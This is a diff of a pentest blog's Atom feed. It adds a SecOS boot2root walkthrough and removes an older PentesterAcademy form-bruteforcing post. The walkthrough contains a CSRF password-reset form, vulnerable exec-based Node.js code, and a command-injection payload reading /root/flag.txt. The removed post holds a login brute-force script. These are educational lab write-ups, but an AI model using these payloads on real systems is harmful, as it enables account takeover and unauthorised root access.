@@ -4,7 +4,7 @@
   <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2015-02-03T15:21:06+02:00</updated>
+  <updated>2015-02-05T17:07:23+02:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,274 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Pentest lab - SecOS]]></title>
+    <link href="http://chousensha.github.io/blog/2015/02/04/pentest-lab-secos/"/>
+    <updated>2015-02-04T13:36:51+02:00</updated>
+    <id>http://chousensha.github.io/blog/2015/02/04/pentest-lab-secos</id>
+    <content type="html"><![CDATA[<p>SecOS is a web based VM created by PaulSec. Here is the briefing:</p>
+
+<blockquote><p>Not too tired after BSides London? Still want to solve challenges? Here is the VM I told about during my talk where you&rsquo;ll have to practice some of
+your skills to retrieve the precious flag located here: /root/flag.txt. This VM is an entry-level boot2root and is web based.</p></blockquote>
+
+<!-- more -->
+
+
+<p>The beginning should be familiar by now&hellip;</p>
+
+<p>``` plain
+nmap -A -p1-65535 192.168.80.128</p>
+
+<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-02-04 13:36 EET
+Nmap scan report for 192.168.80.128
+Host is up (0.00085s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     (protocol 2.0)
+| ssh-hostkey:
+|   1024 9b:d9:32:f5:1d:19:88:d3:e7:af:f0:4e:21:76:7a:c8 (DSA)
+|   2048 90:b0:3d:99:ed:5b:1b:e1:d4:e6:b5:dd:e9:70:89:f5 (RSA)
+|<em>  256 78:2a:d9:e3:63:83:24:dc:2a:d4:f6:4a:ac:2c:70:5a (ECDSA)
+8081/tcp open  http    Node.js (Express middleware)
+|</em>http-title: Secure Web App
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="http://www.insecure.org/cgi-bin/servicefp-submit.cgi">http://www.insecure.org/cgi-bin/servicefp-submit.cgi</a> :
+SF-Port22-TCP:V=6.47%I=7%D=2/4%Time=54D20435%P=x86_64-unknown-linux-gnu%r(
+SF:NULL,27,&ldquo;SSH-2.0-OpenSSH_6.6p1\x20Ubuntu-2ubuntu1\r\n&rdquo;);
+MAC Address: 00:0C:29:F4:5D:DC (VMware)
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.11 &ndash; 3.14
+```</p>
+
+<p>Let&rsquo;s see what&rsquo;s running on port 8081:</p>
+
+<p><img class="center" src="/images/pentest/secos/site.png" title="&lsquo;secos site&rsquo; &lsquo;site&rsquo;" ></p>
+
+<p>Looking at the about page, we can see the site is really secure!</p>
+
+<p><img class="center" src="/images/pentest/secos/about.png" title="&lsquo;secos about&rsquo; &lsquo;about&rsquo;" ></p>
+
+<p>Also, there is some sort of hint in the source code:</p>
+
+<p>``` html</p>
+
+<!--<li><a href="http://chousensha.github.io/hint">Wanna help?</a></li>!-->
+
+
+<p>```</p>
+
+<p>Checking that page, there is this message:</p>
+
+<p><img class="center" src="/images/pentest/secos/doh.png" title="&lsquo;troll&rsquo; &lsquo;troll&rsquo;" ></p>
+
+<p>Well, there is something to see in the source code:</p>
+
+<p>``` html</p>
+
+<!--
+        First: the admin visits the website (really) frequently
+        Second: He runs it locally, on 127.0.0.1. 
+        Third: CSRF and /(http:\/\/[-\/\.\w:0-9\?&]+)/gi, I think that's enough
+        !-->
+
+
+<p>```</p>
+
+<p>I created a user to check the functionality of the app. It seems you can send and receive messages between users. The spiderman user is the admin, so we&rsquo;re mainly interested in that account. Using the hint, the likely course seems to be crafting a CSRF request to change the admin&rsquo;s password and sending it to him in a message.</p>
+
+<p>First, a HTML form that will take care of resetting the password:</p>
+
+<p>``` html
+<html>
+<body>
+<form name="changepass" method="post" action="http://127.0.0.1:8081/change-password">
+<input type="hidden" name="username" value="spiderman">
+<input type="hidden" name="password" value="pwned">
+</form></p>
+
+<script type="text/javascript">
+document.changepass.submit();
+</script>
+
+
+<p></body>
+</html>
+```</p>
+
+<p>Breaking it up, the form submits the username and password (which are hidden because we are using Javascript to send them to the server, and not clicking buttons ourselves) to the change password page. Because of the hint we found in the source code, we are using the localhost address instead of the machine&rsquo;s IP. I copied it to <code>/var/www/</code> and served it with apache.</p>
+
+<p>And now to send a message to spiderman, with a URL for him to click:</p>
+
+<p><img class="center" src="/images/pentest/secos/sendcsrf.png" title="&lsquo;sendcsrf&rsquo; &lsquo;sendcsrf&rsquo;" ></p>
+
+<p>Success! His password was reset and we can log in with the new password that we&rsquo;ve just set. In the Messages section, we see that another user also had less than honorable intentions:</p>
+
+<p><img class="center" src="/images/pentest/secos/pirate.png" title="&lsquo;pirate&rsquo; &lsquo;pirate&rsquo;" ></p>
+
+<p>Next thing I did was try to SSH into the box as spiderman, with the password <em>CrazyPassword!</em>. And it worked! In spiderman&rsquo;s home directory, there is a folder called <em>vnwa</em>..a vulnerable web application maybe? I found something potentially interesting buried in the <em>internalServer.js</em> code:</p>
+
+<p>``` plain
+spiderman@SecOS-1:~/vnwa$ cat internalServer.js
+var fs = require(&lsquo;fs&rsquo;);
+var express = require(&lsquo;express&rsquo;);
+var http = require(&lsquo;http&rsquo;);
+var sys = require(&lsquo;sys&rsquo;)
+var exec = require(&lsquo;child_process&rsquo;).exec;
+var crypto = require(&lsquo;crypto&rsquo;);</p>
+
+<p>var utils = require(&lsquo;./lib/utils.js&rsquo;);
+var model = require(&lsquo;./lib/model.js&rsquo;);</p>
+
+<p>var app = express();
+var server = http.createServer(app);</p>
+
+<p>var logger = function (req, res, next) {</p>
+
+<pre><code>console.log(req.connection.remoteAddress + " tried to access : " + req.url);
+next(); // Passing the request to the next handler in the stack.
+</code></pre>
+
+<p>}</p>
+
+<p>// Configuration
+app.configure(function () {</p>
+
+<pre><code>// Session management
+app.use(express.cookieParser());
+app.use(express.session({secret: 'privateKeyForSession'}));
+app.use("/js", express.static(__dirname + '/public/js')); // javascript folder
+app.use("/css", express.static(__dirname + '/public/css')); // javascript folder
+
+app.set('views', __dirname + '/views'); // views folder
+app.set('view engine', 'ejs'); // view engine for this projet : ejs 
+
+app.use(express.bodyParser()); // for POST Requests
+app.use(logger); // Here you add your logger to the stack.
+app.use(app.router); // The Express routes handler.
+</code></pre>
+
+<p>});</p>
+
+<p>app.get(&lsquo;/&rsquo;, function (req, res) {</p>
+
+<pre><code>res.render('ping.ejs', {
+    isConnected: req.session.isConnected,
+    isAdmin: req.session.isAdmin
+});
+</code></pre>
+
+<p>});</p>
+
+<p>// Update password
+app.post(&lsquo;/&rsquo;, function (req, res) {</p>
+
+<pre><code>ip = req.body.ip
+if (ip == "") {
+    utils.redirect(req, res, '/ping-status');
+} else {
+    // getting the command with req.params.command
+    var child;
+    // console.log(req.params.command);
+    child = exec('ping ' + ip, function (error, stdout, stderr) {
+        res.render('ping.ejs', {
+            isConnected: req.session.isConnected,
+            message: stdout,
+            isAdmin: req.session.isAdmin
+        });
+    });
+}
+</code></pre>
+
+<p>});</p>
+
+<p>server.listen(9000, &lsquo;127.0.0.1&rsquo;, function() {
+  console.log(&ldquo;Listening on port 9000&rdquo;);
+});
+```</p>
+
+<p>Indeed, this app is listening on port 9000:</p>
+
+<p><code>plain
+spiderman@SecOS-1:~/vnwa/scripts$ netstat -antp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -               
+...
+</code></p>
+
+<p>By looking at the code, it seems it&rsquo;s a pinging app. During the enumeration phase, I also noticed that unlike the web server we&rsquo;ve exploited, this internal server is run by root:</p>
+
+<p><code>plain
+ps aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+...
+root       186  0.0  0.1   4692   960 ?        Ss   11:40   0:00 sudo -u spiderman sh -c /usr/local/bin/node /home/spiderman/vnwa/server.js
+root       188  0.0  0.1   4692   956 ?        Ss   11:40   0:00 sudo -u root sh -c /usr/local/bin/node /home/spiderman/vnwa/internalServer.js
+...
+</code></p>
+
+<p>To access this application, I set up a SSH tunnel. On my machine, I ran this command:</p>
+
+<p><code>plain
+ssh -f -N -L 4444:127.0.0.1:9000 -l spiderman 192.168.80.128
+</code></p>
+
+<p>This allowed me to connect to the remote application on port 9000 from the browser of my Kali machine. Let me break it up:</p>
+
+<ul>
+<li><p><strong>-f</strong> Requests ssh to go to background just before command execution. This is useful if ssh is going to ask for passwords or passphrases, but the user wants it in the background.</p></li>
+<li><p><strong>-N</strong> Do not execute a remote command.  This is useful for just forwarding ports.</p></li>
+<li><p><strong>-L</strong> [bind_address:]port:host:hostport</p></li>
+</ul>
+
+
+<p>Specifies that the given port on the local (client) host is to be
+forwarded to the given host and port on the remote side.  This
+works by allocating a socket to listen to <strong>port</strong> on the local side,
+optionally bound to the specified <strong>bind_address</strong>.  Whenever a connection is made to this port, the connection is forwarded over
+the secure channel, and a connection is made to <strong>host</strong> port
+<strong>hostport</strong> from the remote machine.</p>
+
+<ul>
+<li><p><strong>-l</strong> Specifies the user to log in as on the remote machine.</p></li>
+<li><p><strong>192.168.80.128</strong> The IP address of the SecOS box</p></li>
+</ul>
+
+
+<p>What this did was forwarding the connections to port 4444 on my local machine to the remote server on port 9000. Remember that the application is only listening on the localhost interface on the SecOS box. So, the SecOS machine is acting as a sort of gateway, tunneling the connections I point to my 4444 port to the 9000 port on localhost. You can read some more about how this works on <a href="http://en.wikibooks.org/wiki/OpenSSH/Cookbook/Tunnels">http://en.wikibooks.org/wiki/OpenSSH/Cookbook/Tunnels</a></p>
+
+<p>Now, in my browser, I went to <a href="http://127.0.0.1:4444/">http://127.0.0.1:4444/</a> and:</p>
+
+<p><img class="center" src="/images/pentest/secos/ping.png" title="&lsquo;ping&rsquo; &lsquo;ping&rsquo;" ></p>
+
+<p>I tried pinging my Kali machine to see if it works but it just appeared to hang. So I tried limiting the amount of pings by entering <code>-c 2</code> after the IP to be pinged. And it worked!</p>
+
+<p><img class="center" src="/images/pentest/secos/pingres.png" title="&lsquo;ping result&rsquo; &lsquo;ping result&rsquo;" ></p>
+
+<p>We know the ping app is running as root, so if we can do remote code execution, we&rsquo;ll be able to run commands as root. And the application is vulnerable to just what we need! Remember these lines from the internal server code:</p>
+
+<p><code>javascript
+ip = req.body.ip
+child = exec('ping ' + ip, function (error, stdout, stderr)
+</code></p>
+
+<p>The <em>ip</em> variable is passed to the <em>exec</em> function without any prior input sanitization. So, we just close the first command (which would be the ping), and insert an additional command of our choosing, which in this case will be to read the flag:</p>
+
+<p><code>plain
+;cat /root/flag.txt
+</code></p>
+
+<p>And profit!</p>
+
+<p><img class="center" src="/images/pentest/secos/win.png" title="&lsquo;flag&rsquo; &lsquo;flag&rsquo;" ></p>
+
+<blockquote><p>Don&rsquo;t tell any big lies today.  Small ones can be just as effective.</p></blockquote>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Pentest lab - Tr0ll]]></title>
@@ -3014,100 +3282,6 @@ information. Stored XSS is also sometimes referred to as Persistent or Type-I XS
 <p>As you can see, DVWA was..damn vulnerable!</p>
 
 <blockquote><p>Cheer Up!  Things are getting worse at a slower rate.</p></blockquote>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[PentesterAcademy WAP Challenge 1: Form Bruteforcing]]></title>
-    <link href="http://chousensha.github.io/blog/2014/07/27/pentesteracademy-wap-challenge-1-form-bruteforcing/"/>
-    <updated>2014-07-27T00:31:26+03:00</updated>
-    <id>http://chousensha.github.io/blog/2014/07/27/pentesteracademy-wap-challenge-1-form-bruteforcing</id>
-    <content type="html"><![CDATA[<p><a href="http://www.pentesteracademy.com">PentesterAcademy</a> has a section dedicated to web application security challenges. In this post I will present my solution to the first challenge, which requires form bruteforcing to authenticate on the provided web page:</p>
-
-<p><a href="http://pentesteracademylab.appspot.com/lab/webapp/1">http://pentesteracademylab.appspot.com/lab/webapp/1</a></p>
-
-<!-- more -->
-
-
-<p>This is how the page looks like:</p>
-
-<p><img class="center" src="/images/wap1.png" title="&lsquo;wap1&rsquo; &lsquo;wap1&rsquo;" ></p>
-
-<p>The provided hint should help with writing a bruteforce script:</p>
-
-<p><strong>Hint:</strong></p>
-
-<p><strong>Company Domain: PentesterAcademy.com</strong></p>
-
-<p><strong>Usernames: jack, admin</strong></p>
-
-<p><strong>Password Complexity: 5 characters and uses only x,y,z lowercase. Password examples &ndash; xxyyz, xyzxy, xyxxx etc.</strong></p>
-
-<p>So, what we need here is to test the login with usernames of the form <em>user@companydomain</em> and 5 character passwords constructed from the given characters.</p>
-
-<p>I wrote a Python script to do that:</p>
-
-<p>``` python
-import requests
-import itertools</p>
-
-<p>url = &lsquo;<a href="http://pentesteracademylab.appspot.com/lab/webapp/1">http://pentesteracademylab.appspot.com/lab/webapp/1</a>&rsquo;</p>
-
-<p>emails = [&lsquo;<a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#106;&#97;&#x63;&#x6b;&#x40;&#112;&#x65;&#x6e;&#116;&#101;&#x73;&#116;&#x65;&#114;&#x61;&#x63;&#x61;&#x64;&#101;&#x6d;&#121;&#46;&#99;&#111;&#x6d;">&#106;&#97;&#99;&#107;&#64;&#x70;&#101;&#110;&#116;&#101;&#115;&#116;&#x65;&#x72;&#97;&#x63;&#97;&#x64;&#101;&#x6d;&#121;&#46;&#99;&#111;&#109;</a>&rsquo;, \</p>
-
-<pre><code>      'admin@pentesteracademy.com']
-</code></pre>
-
-<p>def buildPassList(iterables, r):</p>
-
-<pre><code>passlist = []
-for word in itertools.product(iterables, repeat = r):
-    passlist.append(''.join(word))
-return passlist
-</code></pre>
-
-<p>passlist = buildPassList(&lsquo;xyz&rsquo;, 5)</p>
-
-<p>count = 0
-fail = &lsquo;Failed! Please try again!&rsquo;
-for user in emails:</p>
-
-<pre><code>for passwd in passlist:
-    print 'Try %d - email: %s password: %s' % (count, user, passwd)
-    payload = {'email': user, 'password': passwd}
-    req = requests.get(url, params=payload)
-    if fail not in req.content:
-        print payload
-        print req.content
-        break          
-    count += 1
-</code></pre>
-
-<p>```</p>
-
-<p>I used the requests module, which is very handy for all sorts of URL interaction. To figure out the parameter names and how are they passed to the login form, I tested with some garbage values and saw the URL looked like this:</p>
-
-<p><code>plain
-http://pentesteracademylab.appspot.com/lab/webapp/1?email=test&amp;password=xyz
-</code></p>
-
-<p>From that I knew to use the GET request in the code. Also, when you fail, you get a message stating that you should try again, so I looked for that in the response from the server, and I concluded that if it were absent, it means that the login was successful. When you complete the challenge, there is also a message that says &ldquo;Well done! This challenge has been cracked!&rdquo;</p>
-
-<p>Here is a snippet of the output:</p>
-
-<p><code>plain
-Try 0 - email: jack@pentesteracademy.com password: xxxxx
-Try 1 - email: jack@pentesteracademy.com password: xxxxy
-...
-Try 477 - email: admin@pentesteracademy.com password: zzzxx
-Try 478 - email: admin@pentesteracademy.com password: zzzxy
-{'password': 'zzzxy', 'email': 'admin@pentesteracademy.com'}
-</code></p>
-
-<p>Today&rsquo;s fortune cookie:</p>
-
-<blockquote><p>While you recently had your problems on the run, they&rsquo;ve regrouped and
-are making another attack.</p></blockquote>
 ]]></content>
   </entry>
   
